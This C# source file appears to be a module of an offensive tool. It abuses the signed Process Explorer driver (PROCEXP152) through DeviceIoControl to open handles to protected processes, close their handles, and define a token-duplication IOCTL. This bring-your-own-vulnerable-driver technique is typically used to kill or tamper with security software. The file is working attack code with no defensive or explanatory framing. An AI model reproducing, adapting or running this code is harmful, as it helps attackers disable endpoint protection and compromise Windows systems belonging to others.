using System;
using System.Runtime.InteropServices;
using static Windows.API;
using static Windows.Enums;

namespace ExplorerMen
{

    [StructLayout(LayoutKind.Sequential)]
    struct ProcExpClose
    {
        public ulong pPid;
        public ulong ObjectType;
        public ulong nothing2;
        public IntPtr handle;
    }


    internal class Driver
    {
        internal static readonly uint IOCTL_OPEN_PROTECTED_PROCESS_HANDLE = 0x8335003c;
        internal static readonly uint IOCTL_DUPLICATE_TOKEN = 0x8335000c;
        internal static readonly uint IOCTL_CLOSE_HANDLE = 0x83350004;


        public static IntPtr GetDriverHandle()
        {
            int OPEN_EXISTING = 3;
            int FILE_ATTRIBUTE_NORMAL = 0x00000080;

            return CreateFile("\\\\.\\PROCEXP152", GenricAccessRights.GENERIC_READ, 0, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
        }


        internal static void CloseHandle(IntPtr hDriver, IntPtr handle, int PID, ulong objPointer)
        {
            IntPtr lpInBuffer = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(ProcExpClose)));

            ProcExpClose sProcexp = new()
            {
                pPid = (ulong)PID,
                handle = handle,
                ObjectType = objPointer,
                nothing2 = 0x0
            };

            Marshal.StructureToPtr(sProcexp, lpInBuffer, false);

            bool ret = DeviceIoControl(hDriver, IOCTL_CLOSE_HANDLE, lpInBuffer, Marshal.SizeOf(sProcexp), IntPtr.Zero, 0, IntPtr.Zero, IntPtr.Zero);
#if DEBUG
            if (!ret)
                Console.WriteLine("[-] Error closing handle. ({0})", GetLastErrorString);
#endif
        }


        internal static IntPtr GetProcessHandle(IntPtr hDriver, int PID)
        {
            int nInBufferSize = sizeof(ulong);

            IntPtr lpInBuffer = Marshal.AllocHGlobal(nInBufferSize);
            if (Utils.Is64Bit) Marshal.WriteInt64(lpInBuffer, PID);
            else Marshal.WriteInt32(lpInBuffer, PID);

            IntPtr phProcess = Marshal.AllocHGlobal(sizeof(int)); // PHANDLE

            bool ret = DeviceIoControl(hDriver, IOCTL_OPEN_PROTECTED_PROCESS_HANDLE, lpInBuffer, nInBufferSize, // Why ulong ?? becuase...
                phProcess, Marshal.SizeOf(phProcess), IntPtr.Zero, IntPtr.Zero);

            if (!ret || phProcess == IntPtr.Zero)
                return IntPtr.Zero;


            IntPtr hProc = Marshal.ReadIntPtr(phProcess);
            Marshal.FreeHGlobal(lpInBuffer);
            return hProc;
        }
    }
}
